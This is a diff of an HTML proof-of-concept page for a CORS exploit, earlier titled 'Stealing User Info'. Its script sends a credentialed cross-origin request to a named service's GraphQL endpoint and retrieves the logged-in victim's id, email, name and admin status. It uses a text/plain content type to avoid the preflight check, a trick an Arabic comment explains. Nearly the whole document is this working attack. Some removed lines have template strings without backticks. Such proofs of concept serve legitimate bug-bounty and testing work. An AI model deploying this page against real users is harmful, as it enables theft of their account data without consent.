@@ -1,12 +1,11 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>CORS Exploit Bypass Test</title>
+    <title>CORS Exploit Test</title>
 </head>
 <body>
-    <h1>CORS Exploit - Stealing User Info</h1>
+    <h1>CORS Exploit Test</h1>
     <div id="status" style="font-weight: bold; color: blue;">Sending Request...</div>
     <pre id="output" style="background: #f4f4f4; padding: 10px; border: 1px solid #ccc;"></pre>
 
@@ -16,36 +15,39 @@
 
         const targetUrl = 'https://app.segment.com/gateway-api/graphql?operation=getUserInfo'; 
 
-        const requestData = {
+        const requestPayload = JSON.stringify({
             "operationName": "getUserInfo",
             "variables": {},
             "query": "query getUserInfo {\n  me {\n    id\n    email\n    name\n    isAdmin\n  }\n}"
+        });
+
+        const xhr = new XMLHttpRequest();
+        xhr.open('POST', targetUrl, true);
+        xhr.withCredentials = true;
+
+        xhr.setRequestHeader('Content-Type', 'text/plain');
+
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState === 4) {
+                statusDiv.innerText = "Response Status Code: " + xhr.status;
+                if (xhr.responseText) {
+                    try {
+                        const jsonResponse = JSON.parse(xhr.responseText);
+                        outputPre.innerText = JSON.stringify(jsonResponse, null, 2);
+                    } catch (e) {
+                        outputPre.innerText = xhr.responseText;
+                    }
+                } else {
+                    outputPre.innerText = "(Response Body is Empty)";
+                }
+            }
         };
 
-        // نستخدم text/plain عشان المتصفح ميعملش OPTIONS Preflight
-        fetch(targetUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'text/plain' 
-            },
-            credentials: 'include',
-            body: JSON.stringify(requestData)
-        })
-        .then(async response => {
-            const rawText = await response.text();
-            statusDiv.innerHTML = Response Status: ${response.status} ${response.statusText};
-            
-            try {
-                const data = JSON.parse(rawText);
-                outputPre.innerText = JSON.stringify(data, null, 2);
-            } catch (e) {
-                outputPre.innerText = "Raw Response:\n" + rawText;
-            }
-        })
-        .catch(error => {
-            statusDiv.innerHTML = <span style="color:red;">Error: ${error.message}</span>;
-            outputPre.innerText = "Check Console for details.";
-        });
+        xhr.onerror = function () {
+            statusDiv.innerHTML = "<span style='color:red;'>Network/CORS Error! Check Console for Preflight block.</span>";
+        };
+
+        xhr.send(requestPayload);
     </script>
 </body>
 </html>
